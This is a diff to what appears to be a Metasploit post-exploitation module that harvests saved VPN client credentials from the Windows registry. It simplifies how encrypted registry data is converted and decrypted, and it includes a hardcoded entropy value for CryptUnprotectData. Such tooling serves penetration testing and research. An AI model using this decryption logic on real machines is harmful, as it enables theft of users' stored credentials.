@@ -174,30 +174,6 @@ class MetasploitModule < Msf::Post
     return "IVE:#{ive_index.upcase}"
   end
 
-  # In affected versions, the data is saved as hex bytes in the registry and
-  # can be used as is when calling CryptUnprotectData.
-  #
-  # The fix for CVE-2020-8956 involves a new format where hex bytes
-  # are represented within a two-bytes per char UTF-8 string. In order to
-  # properly convert the hex bytes we're interested in, we first
-  # convert the string from a two-bytes encoding to a one-byte encoding
-  # by getting rid of null bytes (e.g. \x00\x41 becomes \x41).
-  #
-  # Once converted, we can simply pack it back to raw hex bytes.
-  #
-  # NOTE: I'm sure there is a simpler way to do this.
-  #
-  def please_convert(my_str)
-    output = []
-    i = 0
-    while i < my_str.length - 2
-      a = my_str[i] + my_str[i + 2]
-      output.append(a.hex)
-      i += 4
-    end
-    return output.pack('c*')
-  end
-
   def find_creds
 
     # If we execute with elevated privileges, we can go through all registry values
@@ -232,7 +208,7 @@ class MetasploitModule < Msf::Post
             else
               # this means data was encrypted by elevated user using LocalSystem scope and fixed
               # pOptionalEntropy value, adjusting parameters
-              data = please_convert(data[18..-4]) # get rid of '{capi} 1,' and trailing null bytes
+              data = [Rex::Text.to_ascii(data[18..-3])].pack('H*')
               entropy = ['7B4C6492B77164BF81AB80EF044F01CE'].pack('H*')
             end
           else
